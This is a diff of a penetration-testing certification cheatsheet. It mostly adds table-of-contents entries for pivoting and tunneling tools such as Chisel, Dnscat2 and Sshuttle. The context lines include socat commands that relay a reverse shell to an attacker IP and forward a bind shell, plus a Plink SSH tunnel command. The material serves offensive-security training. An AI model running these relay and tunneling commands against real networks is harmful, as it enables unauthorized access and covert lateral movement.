@@ -52,9 +52,16 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
     - [Attacking Email Services](#attacking-email-services)
 - [Pivoting, Tunneling, and Port Forwarding](#pivoting-tunneling-and-port-forwarding)
     - [Dynamic Port Forwarding with SSH and SOCKS Tunneling](#dynamic-port-forwarding-with-ssh-and-socks-tunneling)
-    - [Remote/Reverse Port Forwarding with SSH](#remote-or-reverse-port-forwarding-with-ssh)
-    - [Meterpreter Tunneling & Port Forwarding](#meterpreter-tunneling-and-port-forwarding)
+    - [Remote / Reverse Port Forwarding with SSH](#remote-or-reverse-port-forwarding-with-ssh)
+    - [Meterpreter Tunneling and Port Forwarding](#meterpreter-tunneling-and-port-forwarding)
     - [Socat Redirection with a Reverse Shell / Bind Shell](#Socat-Redirection-with-a-Reverse-Shell-or-Bind-Shell)
+    - [SSH for Windows with Plink](#SSH-for-Windows-with-plink)
+    - [SSH Pivoting with Sshuttle](#SSH-Pivoting-with-Sshuttle)
+    - [Web Server Pivoting with Rpivot](#Web-Server-Pivoting-with-Rpivot)
+    - [Port Forwarding with Windows Netsh](#Port-Forwarding-with-Windows-Netsh)
+    - [DNS Tunneling with Dnscat2](#DNS-Tunneling-with-Dnscat2)
+    - [SOCKS5 Tunneling with Chisel](#SOCKS5-Tunneling-with-Chisel)
+    - [ICMP Tunneling with SOCKS](#ICMP-Tunneling-with-SOCKS)
 - [Active Directory](#active-directory)
     - [Initial Enumeration](#initial-enumeration)
     - [LLMNR/NTB-NS Poisoning](#llmnr-poisoning)
@@ -1016,7 +1023,7 @@ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
 # Uses Socat to listen on port 8080 and then to fork when the connection is received. Then it will connect to the target host on port 8443. (Bind Shell)
 socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofTarget>:8443
 ```
-##### SSH for Windows: plink.exe
+##### SSH for Windows with Plink
 ```
 # Windows-based command that uses PuTTY's Plink.exe to perform SSH dynamic port forwarding and establishes an SSH tunnel with the specified target. This will allow for proxy chaining on a Windows host, similar to what is done with Proxychains on a Linux-based host.
 plink -D 9050 ubuntu@<IPaddressofTarget>
